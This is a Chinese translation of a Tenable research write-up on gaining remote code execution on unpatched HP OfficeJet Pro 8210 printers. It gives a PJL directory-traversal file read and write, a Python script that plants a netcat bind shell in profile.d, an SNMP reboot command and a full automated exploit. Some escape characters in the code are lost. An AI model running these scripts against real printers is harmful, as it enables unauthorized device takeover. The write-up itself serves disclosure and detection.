# 【技术分享】从安全公告到任意代码执行之看我如何黑掉HP的打印机

阅读量 **208625**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-06-22 15:44:22

 **x**

##### 译文声明

本文是翻译文章，文章来源：tenable.com

原文地址：<https://www.tenable.com/blog/rooting-a-printer-from-security-bulletin-to-remote-code-execution>

译文仅供参考，具体内容表达以及含义原文为准。

****

>
> 严正声明：本文仅限于技术讨论与学术学习研究之用，严禁用于其他用途（特别是非法用途，比如非授权攻击之类），否则自行承担后果，一切与作者和平台无关，如有发现不妥之处，请及时联系作者和平台

译者：[ForrestX386](http://bobao.360.cn/member/contribute?uid=2839753620)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**0x00. 前言  
**

打印机可以说是一种非常普通且常见的设备了，不论是在大公司，小公司，学校，甚至一些普通的家庭中，我们都能发现它们的身影，
它们无处不在。但是，在你的安全意识里，你对打印的安全威胁有清晰的认识吗？
还记得上一次更新打印机设备固件是什么时候吗？你可知道你的打印机正在面临着多个公开漏洞的威胁吗？

举个栗子来说吧，今年4月初的时候，HP 披露了一个安全公告，这个安全公告中说到，HP PageWide系列打印机和 OfficeJet Pro
Printers系列打印机均存在任意代码执行漏洞，当时公告的部分内容如下：

我们已经确认了在某些系列的HP打印机设备中确实存在潜在的安全问题，这些安全问题可能会导致潜在的任意代码执行漏洞。

这个安全公告并没有引起人们足够的关注和留意，因为公告中说，这个安全问题只是潜在的漏洞，并非一定发生，
当人们看到关于漏洞的描述中存在’潜在’一词的时候，他们可能就没了继续读下去的兴趣。CVE
组织关于这个漏洞的描述与处理态度更让人们觉得这个漏洞没那么紧急与重要。 截止我写这篇文章的时候，
HP的安全公告已经披露了2个月之久，然而CVE组织对这个漏洞的描述还是空白，而且漏洞的处理进度仍然为’RESERVED’状态

CVSSv2组织对这个安全漏洞的评分是9.8，这让Tenable
公司的逆向工程师们对这个所谓地潜在的漏洞表现出极大的兴趣，这帮家伙没能按耐住内心对于这个漏洞的好奇心，于是他们购买了2台 安全公告中提到的可能存在漏洞的HP
OfficeJet Pro 8210 系列打印机进行测试。（如图1所示）

图1：用于测试的HP OfficeJet Pro 8210 打印机

他们期望购买的这两台打印机正好含有相应漏洞的固件，而不是已经被修复了，事实上，他们的这种行为就是在赌博。如果在所购买的设备中相应的漏洞已被修复了，鬼知道要花多少时间，多少工作量才能逆向回漏洞修复以前的状态。
万幸的是，这两台新买的设备固件都是有漏洞的，而且它们的自动更新功能被禁用了，如图2所示：

  
图2：web界面上查看到的关于设备固件的详细信息

虽然HP在安全公告中已告知读者去 http://www.hp.com/support下载固件更新补丁，
但是我们在HP的支持网站上并没有发现针对OfficeJet Pro 8210 系列打印机的固件更新补丁，这对我门来说是个’好消息’。
当我们在web界面手动执行固件更新的时候，我们发现还是可以将固件更新到修复版本。

Ok，至此，我们新买的两台打印机，一台打了补丁，一台还未修复。 恩，现在是时候开始我们的漏洞挖掘之旅了。  
 **  
**

**0x01. 漏洞挖掘  
**

老规矩，首先用Nmap 扫一下未打补丁的那台打印机开放的端口， 结果如图3所示：

图3：Nmap扫描结果

扫描结果和预期差不多:

1）打印机上运行了HTTP 服务，监听端口为80，,43,8080；

2）打印机启动了行式打印进程（IPD）并在515端口监听；

3）打印机启动了网络打印协议（IPP）并在631端口监听

4）打印机开放了9100端口，Nmap的扫描结果中将这个端口标记为’jetdirect?’, 从字面上看，这的端口就是 原生打印或者是 9100
端口打印的意思

HP 认为基于9100 端口的原生打印技术是它们的专利。我们都知道这个端口可以利用PCL， PostScript
和PJL编程语言进行原生自定义打印。图4所示是一个利用PJL语言通过9100端口获取打印机设备信息的例子：

  
图4

Jens Müller
最近写了一篇题为：[渗透网络打印机：关于Laser打印机和多功能设备中安全缺陷的研究报告](https://www.nds.rub.de/media/ei/arbeiten/2017/01/30/exploiting-printers.pdf)。 他的这篇研究报告详细描述了多个常见的打印机漏洞，其中就有目录遍历漏洞，图5就是一个利用PJL
指令获取远程打印机目录信息的例子：

图5

你可以从图5中看到，指令参数中要列出的目录名字为’0:/’，而打印机响应的信息中却包含两个子目录tmp/ 和 csr_misc/，
如果你试着使用../去切换目录，会发生什么呢？ 比如将指令参数中name的值设置为0:/../../， 看看打印机响应内容是什么，如图6所示：

  
图6

正如你所看到的那样，打印机响应了一串新的目录列表。好了，目前的测试结果都表明这台打印机极有可能存在目录遍历漏洞，
我们在打了补丁的那台打印机上再执行一遍上面的命令， 却得到一个含有错误信息的回应， 如图7所示：

  
图7

这是因为， HP已经在补丁版本中修复了相应了的漏洞。好了，接下来我们开始挖掘漏洞公告中提到的任意代码执行漏洞吧， 我们觉得，我们有很大的机会去复现这个漏洞。

然而，上面发现的目录遍历漏洞好像对我们复现任意代码执行漏洞没有太直接的帮助， 打印机响应信息中的文件系统结构信息好像和我们所熟悉的Linux
文件系统结构不太一样。 也许这里还有其他的目录遍历漏洞入口， 于是我们开始尝试新的测试，如图8所示：

  
图8

注意到没，当我设置目录名字为../../的时候，打印机给我响应了一个 FILEERROR信息。
但是，当我设置目录的名字为../../bin的时候，打印机响应的内容和我们熟悉的Linux 系统中bin目录下的结构信息非常类似，
我们猜想，从这里我们也许能够找到打印机中的linux文件系统全貌信息

但是，又有新的问题了，怎么才能把目录遍历漏洞提升到任意代码执行漏洞呢？首先，你需要了解一些其他的PJL 语言指令，比如： FSQUERY，
FSUPLOAD和FSDOWNLOAD。
这三个指令都可以直接对打印机上的文件进行读写操作，比如，可以利用FSQUERY和FSUPLOAD指令，再结合目录遍历漏洞实现对/etc/passwd
文件的读取，如图9所示:

  
图9

我们可不仅仅满足于任意文件读取漏洞，我们还想对打印机的文件系统进行写操作。
FSDOWNLOAD指令使用的时候需要发送ESC字符，所以Netcat工具可能不太适合这里的场景，于是我们编写了一个python脚本辅助我们完成测试，
脚本内容如下:

让我们非常失望的是： 这个脚本没能成功向打印机文件系统上写入文件 （如图10所示）

  
图10

好像是PJL
语言的解释器进程没有写权限，这对于我们复现任意代码执行漏洞是个很大地打击，我们还想着能替换打印机系统上的某个二进制文件或者执行自定义的bash脚本，
看来这个想法不太可能实现了。 事已至此，我们唯一的希望就是’0:/’ 文件系统是可写的，
我们可以在这个目录下写入自定义文件，再通过其他某种方式将这个写入的文件运行起来。

我们正打算开始实施我们唯一存在可能性的想法的时候，我突然想到了打印机系统的某些地方很可能和传统的Linux系统有功能重叠的地方，我们知道在传统的Linux系统下profile.d/目录下的脚本都会在系统启动的时候自动执行，而打印机系统上我们也发现了含有profile.d/的目录：0:/../../rw/var/etc/profile.d/，我们想那里可能存在一些和传统Linux系统上类似的文件，
于是我们开始了测试，如图11所示：

  
图11

测试结果和我们预期很相似，0:/../../rw/var/etc/profile.d/ 目录中存在和传统Linux 上profile.d目录中类似的数据。

为了测试是否真的可以通过 0:/ filesystem将自定义文件写入0:/../../rw/var/etc/profile.d/
目录中，我们修改了上面的python代码，修改后的代码如下：

    
    
    import socket
        import sys
        
        test = ('test')
        
        if len(sys.argv) != 3:
            print 'nUsage:upload.py [ip] [port]n'
            sys.exit()
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = (sys.argv[1], int(sys.argv[2]))
        print 'connecting to %s port %s' % server_address
        sock.connect(server_address)
        
        dir_query = '@PJL FSDOWNLOAD FORMAT:BINARY SIZE=' + str(len(test)) + ' NAME="0:/../../rw/var/etc/profile.d/writing_test"rn
        dir_query += test
        dir_query += 'x1b%-12345X'
        sock.sendall(dir_query)
        sock.close()

然后我们开始测试，结果如图12所示：

  
图12

是的，你没看错，脚本执行成功，文件写入成功，而且我们还可以通过目录遍历漏洞查看到写入的文件。

Ok，现在我们已经向profile.d目录中写入了脚本文件，我们知道，profile.d目录下的文件很可能是打印机系统启动的时候自动启动的文件，我们离成功复现任意代码执行漏洞只差一步之遥了。接下来，我们要做的就是写入一个反弹shell的脚本，然后重启打印机。

我们已经知道打印机上安装了netcat 工具，所以我们编写了一个利用nc反弹shell的脚本，如下：

    
    
    if [ ! -p /tmp/pwned ]; then
            mkfifo /tmp/pwned
            cat /tmp/pwned | /bin/sh 2>&1 | /usr/bin/nc -l 1270 > /tmp/pwned &
        fi

好了，后门脚本已经ok，接下来就是如何远程重启打印机了，其中给一个方法就是利用web界面上的工具菜单下的重启按钮重启打印机，另一个方法就是利用SNMP
协议的 printer MIB去重启打印机，如下：

    
    
     albinolobster@ubuntu:~$ snmpset -v1 -c public 192.168.1.158 1.3.6.1.2.1.43.5.1.1.3.1 i 4
        iso.3.6.1.2.1.43.5.1.1.3.1 = INTEGER: 4

下面我们又编写了一个自动化反弹shell的脚本，这个脚本集成了向profile.d目录写入反弹shell后门，重启打印机设备的功能，脚本内容如下：

    
    
     # Create a bind shell on an unpatched OfficeJet 8210
        # Write a script to profile.d and reboot the device. When it comes
        # back online then nc to port 1270.
        #
        # easysnmp instructions:
        # sudo apt-get install libsnmp-dev
        # pip install easysnmp
        ##
        
        import socket
        import sys
        from easysnmp import snmp_set
        
        profile_d_script = ('if [ ! -p /tmp/pwned ]; thenn'
                            'tmkfifo /tmp/pwnedn'
                            'tcat /tmp/pwned | /bin/sh 2>&1 | /usr/bin/nc -l 1270 > /tmp/pwned &n
                            'fin')
        
        if len(sys.argv) != 3:
            print 'nUsage:upload.py [ip] [port]n'
            sys.exit()
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        server_address = (sys.argv[1], int(sys.argv[2]))
        print 'connecting to %s port %s' % server_address
        sock.connect(server_address)
        
        dir_query = '@PJL FSDOWNLOAD FORMAT:BINARY SIZE=' + str(len(profile_d_script)) + ' NAME="0:/../../rw/var/etc/profile.d/lol.sh"rn'
        dir_query += profile_d_script
        dir_query += 'x1b%-12345X'
        sock.sendall(dir_query)
        sock.close()
        
        sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock1.connect(server_address)
        dir_query = '@PJL FSQUERY NAME="0:/../../rw/var/etc/profile.d/lol.sh"rn'
        sock1.sendall(dir_query)
        
        response = ''
        while True:
            data = sock1.recv(1)
            if 'n' == data: break
            response += data
        
        print response
        snmp_set('.1.3.6.1.2.1.43.5.1.1.3.1', 4, 'integer', hostname='192.168.1.158', community='public', version=1)
        print 'Done! Try port 1270 in ~30 seconds'

直接执行这个脚本，然后用nc 192.168.1.158 1270 命令连接打印机，等待30s左右，然后就会成功获取远程打印机的shell环境。  
 **  
**

**0x02. Tenable 公司针对此安全漏洞的处理方案  
**

如果你理解了这个漏洞的原理和攻击手段， 你就很容易检测出设备是否存在相应的漏洞。 Tenable
公司已经在5月下旬的时候发布了一个检测此漏洞的[Nessus插件](https://www.tenable.com/plugins/index.php?view=single&id=100461)，
在这个插件中，我们做了一些小的修改，这些修改会让Nessus在扫描打印的时候不会触发打印机通过9100端口打印，这个举动也会让我们广大的客户放心地进行打印机扫描。

总而言之，多花点时间关心下你的打印机安全吧，我们应该像对待电脑一样对待打印机的安全问题，定期地对它们进进行扫描，并给它们更新补丁。

本文翻译自tenable.com [原文链接](https://www.tenable.com/blog/rooting-a-printer-from-security-bulletin-to-remote-code-execution)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **ForrestX386** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86310](/post/id/86310)

安全客 - 有思想的安全新媒体

本文转载自: [tenable.com](https://www.tenable.com/blog/rooting-a-printer-from-security-bulletin-to-remote-code-execution)

如若转载,请注明出处： <https://www.tenable.com/blog/rooting-a-printer-from-security-bulletin-to-remote-code-execution>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __1赞

 __收藏

![](https://p1.ssl.qhmsg.com/dm/200_200_100/t0145127bddbffa6379.jpg)
ForrestX386

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

